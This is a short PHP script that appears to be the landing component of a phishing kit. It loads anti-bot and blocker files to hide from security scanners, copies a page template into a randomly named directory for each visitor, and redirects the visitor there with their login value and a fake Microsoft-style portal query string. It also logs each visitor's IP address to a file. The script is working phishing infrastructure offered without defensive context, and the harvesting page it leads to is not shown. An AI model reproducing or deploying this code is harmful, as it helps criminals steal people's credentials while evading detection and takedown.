<?php
require_once('antibots.php');
require_once('blocker.php');
include 'antibots.php';
include 'blocker.php';

session_start();
$_SESSION['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$login = $_GET['login'];
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="new";
recurse_copy( $home, $DIR );
header("location:$DIR?login=$login&?auth=2&home=1&from=PortalLanding&client-request-id=bcc7c79d-ad79-43ec-9c70-d12e378805d20cDovL3d3dy5hc@#&^#&&787778377vhefhhgfnvshnHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3NGY4MTI3ZGZhMWNkNDBlNWZkNGY0MWNGxlLmNvbS9zaG9wL2FjY291bnQvc2V0dXAvc3RhcnQ_c=");
$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>